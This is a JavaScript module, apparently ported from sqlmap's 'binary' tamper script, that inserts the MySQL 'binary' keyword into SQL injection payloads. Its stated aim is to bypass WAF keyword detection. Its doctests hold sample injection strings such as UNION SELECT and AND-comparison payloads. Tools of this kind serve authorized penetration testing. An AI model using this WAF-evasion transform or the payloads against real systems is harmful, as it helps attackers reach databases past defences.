// 在适用位置注入 MySQL `binary` 关键字（对标 sqlmap 1.10.10 tamper/binary.py）
//
// [T-1 2026-10-07] 旧实现是**另一件事**：把字符串字面量里的每个字符逐个换成
//   `0b<二进制>` 并留在引号内 ⇒ `'admin'` → `'0b11000010b11001000b...'`。
//   这是**语义损失**：比较用的字面量被换成了另一个字符串值（`WHERE user='admin'`
//   从此恒不成立），检测拿到的是"目标没数据"而不是"目标有洞"。
//   而上游 binary.py 做的是**在值前面插 `binary` 关键字**（改 token 分类、
//   清 libinjection 一类的判定），不变值本身。
//   ⇒ 本件改为上游算法。字面量 → 二进制字面量的那一面由 `string2binary`
//     承担（它产出的是**合法**的 `0b...` 字面量，不带引号），两条通道不再重叠。
// 上游算法（逐条对应，顺序不可换）：
//   ① NULL → binary NULL
//   ② THEN <值> ELSE <值> → THEN binary <值> ELSE binary <值>
//   ③ <数> [>=] <数> → binary <数> [>=] binary <数>
//   ④ (AND|OR) <数> → (AND|OR) binary <数>
//   ⑤ [>=] <数> → [>=] binary <数>
//   ⑥ 0x… → binary 0x…
//   ⑦ 折叠重复出现的 " binary"（⑥ 会与 ② 撞车）
export const binary = {
  name: 'binary',
  description: '在适用位置注入 MySQL binary 关键字，改变 token 分类以绕过 WAF 关键字检测',
  doctests: [
    // 上游官方示例（tag 1.10.10，三条全与上游一致）
    { input: '1 UNION ALL SELECT NULL, NULL, NULL', output: '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL' },
    { input: '1 AND 2>1', output: '1 AND binary 2>binary 1' },
    { input: 'CASE WHEN (1=1) THEN 1 ELSE 0x28 END', output: 'CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END' },
    // 语义不损失：字符串字面量不再被改写（旧实现会把 'admin' 变成另一个值）
    { input: "1 AND 'admin'='admin'", output: "1 AND 'admin'='admin'" },
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    let s = String(payload ?? '');
    if (!s) return s;
    s = s.replace(/\bNULL\b/g, 'binary NULL');
    s = s.replace(/\b(THEN\s+)(\d+|0x[0-9a-f]+)(\s+ELSE\s+)(\d+|0x[0-9a-f]+)/gi,
      '$1binary $2$3binary $4');
    s = s.replace(/(\d+\s*[>=]\s*)(\d+)/g, 'binary $1binary $2');
    s = s.replace(/\b((?:AND|OR)\s*)(\d+)/gi, '$1binary $2');
    s = s.replace(/([>=]\s*)(\d+)/g, '$1binary $2');
    s = s.replace(/\b(0x[0-9a-f]+)/gi, 'binary $1');
    // Python `re.sub(r"(\s+binary)+", r"\g<1>")`：重复组取最后一次捕获 ⇒ 折叠成一份
    s = s.replace(/(\s+binary)+/g, '$1');
    return s;
  },
};
export default binary;
